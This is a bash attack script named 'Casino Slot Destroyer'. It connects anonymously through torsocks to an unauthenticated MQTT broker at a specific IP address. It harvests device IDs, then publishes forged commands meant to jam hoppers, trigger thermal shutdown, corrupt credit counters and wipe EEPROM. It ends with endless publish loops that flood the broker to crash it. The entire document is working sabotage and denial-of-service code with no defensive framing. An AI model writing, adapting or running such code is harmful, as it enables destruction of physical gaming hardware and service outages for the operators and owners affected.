#!/bin/bash
# 💀 CASINO SLOT DESTROYER - BRICK HARDWARE + DOS
HOST="188.14.144.138"
PORT="1883"

# Extract ALL MACs
torsocks mosquitto_sub -h $HOST -p $PORT -t '#' -v -C 30 2>/dev/null | \
grep -oE '([0-9a-f]{20})' | grep -E '^(893571|893901)' | sort -u | \
while read MAC; do
    echo "🔥 BRICKING $MAC..."
    
    # 1. HARDWARE FAULT INJECTION
    torsocks mosquitto_pub -h $HOST -p $PORT -t "m/o/$MAC" -m '{"fault":"CRITICAL","hopper_jam":true,"eject_loop":999,"thermal_shutdown":true}' &
    torsocks mosquitto_pub -h $HOST -p $PORT -t "m/k/$MAC" -m '{"servo_stuck":true,"coin_jam":999,"display_freeze":true}' &
    
    # 2. MEMORY CORRUPTION
    torsocks mosquitto_pub -h $HOST -p $PORT -t "m/o/$MAC" -m '{"credits":-999999999,"cycle":999999,"overflow":true,"eeprom_wipe":true}' &
    
    # 3. INFINITE HOPPER JAM (fisico brick)
    for i in {1..999}; do
        torsocks mosquitto_pub -h $HOST -p $PORT -t "m/o/$MAC" -m "{\"drop\":\"MAX\",\"coins\":9999999,\"jam\":true,\"cycle\":$i}" &
    done &
    
    # 4. DOS FLOOD (crash broker)
    while true; do
        torsocks mosquitto_pub -h $HOST -p $PORT -t "m/o/$MAC" -m '{}' &
    done &
done &

# EXTRA: Broker crash flood
while true; do
    torsocks mosquitto_pub -h $HOST -p $PORT -t '#' -m '{"dos":true}' &
done
